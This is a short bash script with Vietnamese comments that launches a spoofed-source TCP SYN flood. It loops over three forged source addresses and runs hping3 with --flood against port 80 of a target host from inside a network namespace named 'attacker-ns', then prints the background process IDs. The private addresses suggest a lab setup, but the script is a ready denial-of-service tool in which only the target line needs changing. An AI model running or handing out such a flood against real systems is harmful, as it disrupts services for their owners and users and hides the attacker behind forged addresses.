# target = máy đích
target=192.168.1.100

# danh sách địa chỉ nguồn muốn spoof
ips=("10.0.0.1" "10.0.0.2" "10.0.0.3")

for ip in "${ips[@]}"; do
  sudo ip netns exec attacker-ns \
    hping3 -S -p 80 --flood -d 20 -a "$ip" "$target" &
done

# lưu PIDs nếu muốn kill sau:
pids=$(jobs -p)
echo "Started PIDs: $pids"
